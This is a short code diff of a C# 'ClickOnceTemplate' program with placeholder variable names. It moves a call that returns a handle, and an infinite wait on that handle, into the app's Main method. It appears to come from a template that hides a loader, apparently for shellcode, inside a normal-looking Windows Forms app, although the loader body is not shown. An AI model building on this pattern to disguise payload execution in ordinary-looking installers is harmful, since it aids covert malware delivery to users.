@@ -31,21 +31,15 @@ namespace ClickOnceTemplate
         [STAThread]
         static void Main()
         {
-	    Thread VAR51 = new Thread(() => VAR50());
-            VAR51.Start();
+            IntPtr VAR7 = VAR8();
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
-
-        }
-	    
-	static void VAR50() {
-	    IntPtr VAR7 = VAR8();
-            if (VAR7 != IntPtr.Zero)
+	    if (VAR7 != IntPtr.Zero)
             {
                 WaitForSingleObject(VAR7, 0xffffffff);
-            }		
-	}
+            }	
+        }
 
         static IntPtr VAR8()
         {
